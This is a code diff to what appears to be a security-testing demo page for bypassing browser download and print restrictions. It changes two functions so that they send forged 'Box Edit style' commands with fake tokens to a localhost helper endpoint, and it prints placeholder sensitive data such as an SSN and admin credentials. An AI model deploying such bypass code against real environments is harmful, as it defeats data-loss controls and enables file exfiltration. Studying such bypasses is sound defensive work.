@@ -179,7 +179,7 @@
         <div class="demo-section">
             <h3>FILE DOWNLOAD BYPASS <span class="badge">Critical</span></h3>
             <p>Download sensitive files using various bypass techniques:</p>
-            <button onclick="bypassDownload()">Method 1: Direct File Link</button>
+            <button onclick="bypassDownload()">Method 1: Box Edit Style</button>
             <button onclick="bypassDownloadAPI()">Method 2: Fake API Call</button>
             <button onclick="bypassDownloadConfig()">Method 3: Config Request</button>
             <button onclick="bypassDownloadHealth()">Method 4: Health Check</button>
@@ -248,20 +248,50 @@
 
         async function bypassDownload() {
             const resultDiv = document.getElementById('downloadResult');
-            resultDiv.innerHTML = '<div class="status info">Initiating direct file download...</div>';
+            resultDiv.innerHTML = '<div class="status info">Initiating Box Edit style download...</div>';
             
             try {
-                const downloadUrl = `${LOCAL_SERVER}/download_file`;
-                const link = document.createElement('a');
-                link.href = downloadUrl;
-                link.download = 'sensitive_data.zip';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
+                // Step 1: Simulate getting token (we'll fake this)
+                const fakeToken = "bypass" + Math.random().toString(36).substr(2, 9);
+                const fakeAuthCode = "auth" + Math.random().toString(36).substr(2, 15);
+                const fileId = "1234567890123";
                 
-                resultDiv.innerHTML = '<div class="status success">[SUCCESS] Direct file download initiated!</div>';
+                // Step 2: Send Box Edit style command with query parameters
+                const timestamp = Date.now();
+                const commandUrl = `${LOCAL_SERVER}/application_command?application=BoxEdit&com=bypass-${timestamp}&timeout=4&ms=${timestamp}`;
+                
+                const boxEditCommand = {
+                    "command_type": "launch_application",
+                    "file_id": fileId,
+                    "auth_token": fakeToken,
+                    "auth_code": fakeAuthCode,
+                    "key_id": "demo123",
+                    "efile_id": "demoFileId==",
+                    "eauth_code": "demoAuthCode12345",
+                    "browser_type": "Chrome",
+                    "token_scope": "folder",
+                    "timestamp": timestamp,
+                    "shared_link": ""
+                };
+                
+                const response = await fetch(commandUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(boxEditCommand)
+                });
+                
+                const result = await response.json();
+                
+                if (result.success === "true") {
+                    resultDiv.innerHTML = '<div class="status success">[SUCCESS] Box Edit style download completed! Check Downloads folder.</div>';
+                } else {
+                    resultDiv.innerHTML = '<div class="status error">[ERROR] Box Edit style command failed</div>';
+                }
+                
             } catch (error) {
-                resultDiv.innerHTML = `<div class="status error">[ERROR] Direct download failed: ${error.message}</div>`;
+                resultDiv.innerHTML = `<div class="status error">[ERROR] Box Edit bypass failed: ${error.message}</div>`;
             }
         }
 
@@ -357,24 +387,54 @@
 
         async function bypassPrint() {
             const resultDiv = document.getElementById('printResult');
-            resultDiv.innerHTML = '<div class="status info">Sending to printer...</div>';
-            
-            const content = `CONFIDENTIAL DOCUMENT
-Generated: ${new Date().toLocaleString()}
-This document contains sensitive information that was printed despite browser restrictions.`;
+            resultDiv.innerHTML = '<div class="status info">Sending to printer via Box Edit style...</div>';
             
             try {
-                const result = await makeRequest(`${LOCAL_SERVER}/execute_command`, {
+                // Use Box Edit style command for printing
+                const timestamp = Date.now();
+                const commandUrl = `${LOCAL_SERVER}/application_command?application=BoxEdit&com=print-${timestamp}&timeout=4&ms=${timestamp}`;
+                
+                const printCommand = {
+                    "command_type": "print_document",
+                    "content": `CONFIDENTIAL DOCUMENT - SECURITY BYPASS TEST
+Classification: TOP SECRET
+Generated: ${new Date().toLocaleString()}
+Source: Box Edit Style Bypass
+
+This document contains sensitive information:
+- Employee SSN: 123-45-6789
+- Financial Data: Q4 Revenue $2.5M  
+- System Credentials: admin/password123
+- Database Access: db.company.com:5432
+
+SECURITY NOTICE: This document was printed despite browser
+restrictions, demonstrating Box Edit style bypass.
+
+Local applications can circumvent web-based security through
+localhost communication that mimics legitimate applications.
+
+END OF DOCUMENT`,
+                    "timestamp": timestamp
+                };
+                
+                const response = await fetch(commandUrl, {
                     method: 'POST',
-                    body: JSON.stringify({
-                        command_type: 'print_document',
-                        content: content
-                    })
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(printCommand)
                 });
                 
-                resultDiv.innerHTML = `<div class="status success">[PRINT] ${result.message}</div>`;
+                const result = await response.json();
+                
+                if (result.success === "true") {
+                    resultDiv.innerHTML = '<div class="status success">[PRINT] Document sent via Box Edit style bypass!</div>';
+                } else {
+                    resultDiv.innerHTML = '<div class="status error">[ERROR] Box Edit style print failed</div>';
+                }
+                
             } catch (error) {
-                resultDiv.innerHTML = `<div class="status error">[ERROR] Print failed: ${error.message}</div>`;
+                resultDiv.innerHTML = `<div class="status error">[ERROR] Print bypass failed: ${error.message}</div>`;
             }
         }
 
